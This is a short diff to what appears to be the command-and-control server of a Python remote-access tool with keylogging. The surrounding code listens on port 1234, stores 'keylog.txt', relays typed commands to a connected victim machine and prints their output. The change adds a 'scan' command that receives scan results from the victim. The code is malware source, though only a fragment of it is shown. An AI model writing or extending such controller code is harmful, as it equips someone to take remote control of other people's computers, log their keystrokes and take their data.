@@ -5,6 +5,7 @@ ip_address = '0.0.0.0'
 port_number = 1234
 keylog_file = "keylog.txt"
 
+
 def handle_connection(connection, address):
     print(f"Connexion établie avec {address}")
 
@@ -39,6 +40,12 @@ def handle_connection(connection, address):
                 print("Capture réussie !")
                 continue
 
+            elif command.startswith("scan"):
+                print("Scan en cours...")
+                response = connection.recv(4096).decode()
+                print(f"Résultat du scan :\n{response}")
+                continue
+
             else:
                 connection.send(command.encode())
 
@@ -47,7 +54,6 @@ def handle_connection(connection, address):
                     break
 
                 print(f"Output:\n{response}")
-
         except Exception as e:
             print(f"Error: {e}")
             break
